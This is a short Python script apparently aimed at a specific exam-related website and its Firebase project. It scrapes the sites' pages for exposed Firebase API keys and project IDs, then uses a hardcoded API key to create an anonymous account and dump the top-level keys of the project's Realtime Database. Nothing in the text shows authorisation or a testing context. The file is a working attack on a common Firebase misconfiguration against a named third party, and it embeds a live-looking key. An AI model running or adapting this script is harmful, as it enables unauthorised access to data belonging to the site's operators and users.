import re
import urllib.request
import json

API_KEY = "AIzaSyAf99rLyRrjxwXt16nE4yFovp_K97YcV2g"

urls = [
    "https://www.scholaxiacbtexam.blog/",
    "https://scholaxia-1-d5330.web.app/",
]
for u in urls:
    try:
        req = urllib.request.Request(u, headers={"User-Agent": "Mozilla/5.0"})
        html = urllib.request.urlopen(req, timeout=15).read().decode("utf-8", "ignore")
        keys = re.findall(r'apiKey["\':\s]+([A-Za-z0-9_-]+)', html)
        projs = re.findall(r'projectId["\':\s]+([a-zA-Z0-9_-]+)', html)
        scripts = re.findall(r'src="([^"]+)"', html)
        print(u, "apiKeys", keys[:5], "projects", projs[:5])
        print("  scripts", scripts[:10])
        for term in ["firebase", "firestore", "api/", "cloudfunctions"]:
            if term in html.lower():
                print("  found", term)
    except Exception as e:
        print(u, "ERR", e)

# anonymous auth + root RTDB scan
body = json.dumps({"returnSecureToken": True}).encode()
req = urllib.request.Request(
    f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={API_KEY}",
    data=body,
    headers={"Content-Type": "application/json"},
)
auth = json.loads(urllib.request.urlopen(req).read().decode())
token = auth["idToken"]
root = urllib.request.urlopen(
    f"https://scholaxia-1-d5330-default-rtdb.firebaseio.com/.json?auth={token}&shallow=true"
).read().decode()
print("RTDB shallow keys:", root[:500])
